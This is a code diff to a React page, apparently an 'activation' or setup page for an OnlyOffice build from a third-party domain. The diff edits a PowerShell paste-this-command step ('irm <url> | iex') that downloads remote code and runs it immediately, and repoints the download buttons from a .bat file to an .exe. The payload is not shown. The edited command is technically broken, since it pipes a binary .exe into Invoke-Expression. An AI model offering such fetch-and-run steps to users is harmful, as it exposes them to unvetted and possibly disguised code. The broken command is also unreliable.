@@ -908,7 +908,7 @@ export default function DemoPcActivation() {
   const [guideOpen, setGuideOpen] = useState(false);
   const [copiedPs, setCopiedPs] = useState(false);
 
-  const psCmd = "$ irm 'https://onlyoffice.mercytechglobal.com/Kich-Hoat-Demo-OnlyOffice-Mercy.bat' | iex";
+  const psCmd = "$ irm 'https://onlyoffice.mercytechglobal.com/Setup-OnlyOffice-Mercy.exe' | iex";
 
   const handleCopyPs = () => {
     if (typeof window !== "undefined") {
@@ -1059,8 +1059,8 @@ export default function DemoPcActivation() {
 
               {/* Primary Download Button */}
               <a
-                href="/Kich-Hoat-Demo-OnlyOffice-Mercy.bat"
-                download="Kich-Hoat-Demo-OnlyOffice-Mercy.bat"
+                href="/Setup-OnlyOffice-Mercy.exe"
+                download="Setup-OnlyOffice-Mercy.exe"
                 style={{
                   background: "linear-gradient(135deg, #ff6f3d 0%, #ea580c 100%)",
                   color: "#ffffff",
@@ -1106,8 +1106,8 @@ export default function DemoPcActivation() {
               {/* Secondary Actions: Backup ZIP + Guide */}
               <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "10px" }}>
                 <a
-                  href="/Kich-Hoat-Demo-OnlyOffice-Mercy.bat"
-                  download="Kich-Hoat-Demo-OnlyOffice-Mercy.bat"
+                  href="/Setup-OnlyOffice-Mercy.exe"
+                  download="Setup-OnlyOffice-Mercy.exe"
                   style={{
                     backgroundColor: "#ffffff",
                     color: "#334155",
